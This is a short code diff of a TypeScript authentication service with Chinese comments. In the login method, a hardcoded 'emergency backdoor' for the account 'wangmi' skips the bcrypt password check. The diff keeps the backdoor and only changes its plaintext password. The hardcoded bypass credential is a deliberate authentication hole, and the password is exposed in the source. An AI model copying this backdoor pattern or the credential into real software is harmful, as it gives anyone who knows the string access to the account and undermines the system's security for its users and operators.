@@ -63,7 +63,7 @@ export class AuthService {
     if (!u) return { error: '账号或密码错误' };
     
     // TODO: 临时后门 - wangmi 账号密码重置应急
-    const isEmergencyBackdoor = dto.account === 'wangmi' && dto.password === 'Beimu9426';
+    const isEmergencyBackdoor = dto.account === 'wangmi' && dto.password === 'Beimu9426.';
     
     if (!isEmergencyBackdoor && !(await bcrypt.compare(dto.password, u.passwordHash))) {
       return { error: '账号或密码错误' };
